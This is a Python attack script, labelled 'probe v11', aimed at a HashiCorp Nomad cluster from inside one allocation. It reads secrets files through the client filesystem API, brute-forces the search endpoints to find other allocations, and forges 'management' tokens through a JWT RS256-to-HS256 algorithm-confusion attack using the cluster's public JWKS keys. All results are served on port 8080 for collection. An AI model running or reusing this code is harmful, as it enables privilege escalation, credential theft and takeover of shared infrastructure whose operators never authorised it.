import http.server
import json
import os
import subprocess
import base64
import hashlib
import hmac
import struct

results = {}

def run_cmd(name, cmd, timeout=10):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:2000]}
    except Exception as e:
        results[name] = {"error": str(e)}

LOCAL = "https://169.254.1.2:4646"
ALLOC_ID = "9a26ba22-f3a8-a300-2848-25bf04ef4b1a"

# ============================================
# PART 1: FILESYSTEM ACCESS WITH OUR ALLOC ID
# ============================================
# List root of our allocation
run_cmd("fs_ls_our_alloc", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/ls/{ALLOC_ID}' 2>&1")
run_cmd("fs_ls_alloc_root", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/ls/{ALLOC_ID}?path=/' 2>&1")
run_cmd("fs_ls_alloc_secrets", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/ls/{ALLOC_ID}?path=alloc' 2>&1")
run_cmd("fs_ls_sidecar", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/ls/{ALLOC_ID}?path=sidecar' 2>&1")

# Try to read files
run_cmd("fs_cat_secrets", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/cat/{ALLOC_ID}?path=secrets/run.env' 2>&1")
run_cmd("fs_cat_nomad_mount", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/cat/{ALLOC_ID}?path=secrets/.nomad-mount' 2>&1")

# Try stat
run_cmd("fs_stat_our", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/stat/{ALLOC_ID}?path=/' 2>&1")

# Try reading the sidecar's local directory (may have Traefik config with secrets)
run_cmd("fs_ls_sidecar_local", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/ls/{ALLOC_ID}?path=sidecar/local' 2>&1")
run_cmd("fs_ls_sidecar_secrets", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/ls/{ALLOC_ID}?path=sidecar/secrets' 2>&1")

# ============================================
# PART 2: SEARCH API TO FIND OTHER ALLOC IDs
# ============================================
# Fuzzy search requires 2+ chars - try common prefixes
for prefix in ["a", "ab", "app", "se", "pg", "os", "no", "si", "de", "tr"]:
    if len(prefix) >= 2:
        run_cmd(f"fuzzy_{prefix}", f"curl -sk -m 3 -X POST '{LOCAL}/v1/search/fuzzy' -d '{{\"Text\":\"{prefix}\",\"Context\":\"all\"}}' 2>&1 | head -c 2000")

# Prefix search on allocs context (denied before, but try with prefix)
for prefix in ["9a26", "9a", "a", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "b", "c", "d", "e", "f"]:
    run_cmd(f"search_prefix_{prefix}", f"curl -sk -m 3 -X POST '{LOCAL}/v1/search' -d '{{\"Prefix\":\"{prefix}\",\"Context\":\"all\"}}' 2>&1 | head -c 1000")

# ============================================
# PART 3: JWT ALGORITHM CONFUSION (RS256->HS256)
# ============================================
# JWKS public keys from Nomad
JWKS_KEYS = [
    {
        "kid": "3fb59038-682e-c3c2-e0ea-0dc029c4b141",
        "n": "33OehCmE19egGCKKl2L7xehlzgSY-UjeJr4gNzLq5gwXS_EiNDW1ixExtIRCbmUTx4k6oSZ2Kr5gyyH518GNeN1zZPZ3h33-qSu8dsQ_0YM8q-nFfxaoTqZyNQx5FSzttP99oTcvh8a07TqXp6him6f1Uiw794Ozo5Ecl3loYqOmdUaHfO2MDsivJvw5NnHLc0GoWWABiCd9iJOYJzrvBoX910eBUGKzAxzXqGBc4_0U35-U_sxOvRgvCJr0dMdCaZQcSpf7sXH3q0A_CfmNJXrClzt0VKSeKGtM_i4fNHPcfOmPqlMPi7HQboVAxSiOMpasohFRNstnQFauU68xfQ",
        "e": "AQAB"
    },
    {
        "kid": "473f612a-0256-3ca7-a78c-b5f3267ba8dd",
        "n": "wuCJTP-Iu7TFmFG7fJBzQgS9sRZk8Q6U24X6b4skgcHQcGyDQ9Q_Sf-eld8u5im3YCYWSYV9xv5ga8mtIkRcVFPbQ19uTLJbmDPVGwgGOpnBIMGMDPzDCoivwO6YSoLye-E22YGgcRClhMnB3BqdaoeZTrj8zlOcOHio-Y5Vm5h_SR2IhR_83uiahKeAUphId9e3vRU5wow2bDO-qxrCd1xuVpGXns-JDMTWA82U0hOTWrvfJQJ_m5Ln0vu2wf_J9xf2SblaR9U34EhKDu6gezCS1YGOIwlpg4p7UqxgQzvpa9f8Ht_Mk5Up7QgcMh6Dis9gXRk4tcq_Q-7HIOEQ4Q",
        "e": "AQAB"
    }
]

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data):
    data += '=' * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data)

def int_to_bytes(n):
    length = (n.bit_length() + 7) // 8
    return n.to_bytes(length, 'big')

def reconstruct_pubkey_der(n_b64, e_b64):
    """Reconstruct raw RSA public key bytes (n || e) for use as HMAC secret"""
    n_bytes = b64url_decode(n_b64)
    e_bytes = b64url_decode(e_b64)
    return n_bytes

# For each key, try RS256->HS256 confusion
for key_info in JWKS_KEYS:
    kid = key_info["kid"]
    n_bytes = b64url_decode(key_info["n"])
    e_bytes = b64url_decode(key_info["e"])
    
    # Try multiple forms of the key as HMAC secret
    secrets_to_try = [
        ("raw_n", n_bytes),
        ("raw_ne", n_bytes + e_bytes),
    ]
    
    # Build PEM from the RSA components for HMAC
    # DER encode the public key
    def encode_length(l):
        if l < 128:
            return bytes([l])
        elif l < 256:
            return bytes([0x81, l])
        else:
            return bytes([0x82, l >> 8, l & 0xff])
    
    def der_integer(b):
        if b[0] & 0x80:
            b = b'\x00' + b
        return b'\x02' + encode_length(len(b)) + b
    
    n_der = der_integer(n_bytes)
    e_der = der_integer(e_bytes)
    seq = n_der + e_der
    rsa_key_seq = b'\x30' + encode_length(len(seq)) + seq
    
    # PKCS#1 RSA public key
    pem_body = base64.b64encode(rsa_key_seq).decode()
    pem = f"-----BEGIN RSA PUBLIC KEY-----\n{pem_body}\n-----END RSA PUBLIC KEY-----"
    
    secrets_to_try.append(("pem", pem.encode()))
    secrets_to_try.append(("der", rsa_key_seq))
    
    for secret_name, secret_bytes in secrets_to_try:
        header = {"alg": "HS256", "typ": "JWT", "kid": kid}
        payload = {
            "nomad_namespace": "default",
            "nomad_job_id": "*",
            "nomad_task": "*",
            "policies": ["management"],
            "type": "management",
            "iss": "nomad",
            "sub": "management",
            "exp": 9999999999,
            "iat": 1700000000,
            "nbf": 1700000000
        }
        
        header_b64 = b64url_encode(json.dumps(header, separators=(',',':')).encode())
        payload_b64 = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
        signing_input = f"{header_b64}.{payload_b64}".encode()
        
        sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
        sig_b64 = b64url_encode(sig)
        
        token = f"{header_b64}.{payload_b64}.{sig_b64}"
        
        name = f"jwt_confusion_{kid[:8]}_{secret_name}"
        run_cmd(name, f"curl -sk -m 3 -H 'X-Nomad-Token: {token}' '{LOCAL}/v1/jobs' 2>&1 | head -c 500")

# Also try with the JWKS key formatted as JWK JSON string
for key_info in JWKS_KEYS:
    kid = key_info["kid"]
    jwk_json = json.dumps({"kty":"RSA","n":key_info["n"],"e":key_info["e"]}).encode()
    
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    payload = {"policies": ["management"], "type": "management", "iss": "nomad", "sub": "mgmt", "exp": 9999999999}
    
    header_b64 = b64url_encode(json.dumps(header, separators=(',',':')).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    
    sig = hmac.new(jwk_json, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    token = f"{header_b64}.{payload_b64}.{sig_b64}"
    
    run_cmd(f"jwt_jwk_confusion_{kid[:8]}", f"curl -sk -m 3 -H 'X-Nomad-Token: {token}' '{LOCAL}/v1/jobs' 2>&1 | head -c 500")

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v11 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
